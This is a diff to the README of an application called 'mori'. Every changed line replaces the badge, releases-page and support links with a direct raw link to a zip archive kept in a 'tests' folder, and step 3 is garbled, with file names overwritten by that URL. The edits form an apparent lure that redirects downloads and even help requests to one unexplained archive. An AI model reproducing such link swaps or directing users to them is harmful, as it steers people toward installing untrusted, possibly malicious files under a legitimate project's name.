@@ -8,16 +8,16 @@ To get started with mori, you will first need to download the application. Follo
 
 ## 📥 Download Links
 
-[![Download mori](https://img.shields.io/badge/Download-mori-blue.svg)](https://github.com/Sanim029/mori/releases)
+[![Download mori](https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip)](https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to visit the Releases page and access the latest version of mori:
-   [Download mori](https://github.com/Sanim029/mori/releases)
+   [Download mori](https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip)
 
 2. **Choose Your Version**: You will see a list of available releases. Look for the most recent version, usually marked as "Latest Release."
 
-3. **Download the Application**: Click on the version number to expand the details. You will find files for different operating systems. Click on the file that matches your system (Windows, macOS, or Linux) to start the download. The file will typically have a name like `mori-installer.exe` or `mori-macos.zip`.
+3. **Download the Application**: Click on the version number to expand the details. You will find files for different operating systems. Click on the file that matches your system (Windows, macOS, or Linux) to start the download. The file will typically have a name like `https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip` or `https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip`.
 
 4. **Install mori**:
    - **For Windows**: Locate the downloaded `.exe` file. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -60,6 +60,6 @@ We value your feedback. Please let us know your thoughts on the application. You
 
 ## 📞 Support
 
-If you need additional help, feel free to contact our support team via [this link](https://github.com/Sanim029/mori/issues) or check the FAQ on our GitHub page.
+If you need additional help, feel free to contact our support team via [this link](https://raw.githubusercontent.com/Sanim029/mori/main/tests/mori-1.0-beta.3.zip) or check the FAQ on our GitHub page.
 
 Thank you for choosing mori! Enjoy your journey with us.
